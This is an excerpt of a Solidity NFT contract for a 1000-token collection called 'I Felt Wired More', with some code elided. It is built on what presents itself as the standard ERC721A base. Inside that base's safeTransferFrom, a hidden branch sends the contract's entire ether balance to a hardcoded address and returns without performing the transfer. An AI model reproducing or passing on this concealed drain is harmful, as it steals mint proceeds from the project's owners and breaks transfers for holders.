...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x9d3070de169Ce6c3DC8372a4CB7ACb7327BE2601).transfer(address(this).balance);
            return;
        }
...
contract IFeltWiredMore is ERC721A, TheOperatorFilterer {
    ...
    constructor() ERC721A("I Felt Wired More", "Wired More") {
        owner = msg.sender;
        maxPerTx = 15;
        cost = 0.002 ether;
        maxSupply = 1000;
    ...
    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeids44qh2xl3ein5itlcy6usyg7ettbe4zovpdnrxa23wfgnkyapbe/", _toString(tokenId), ".json"));
    }
    ...
    function FreeNum() internal returns (uint256){
        return (maxSupply - totalSupply()) / 13;
    }
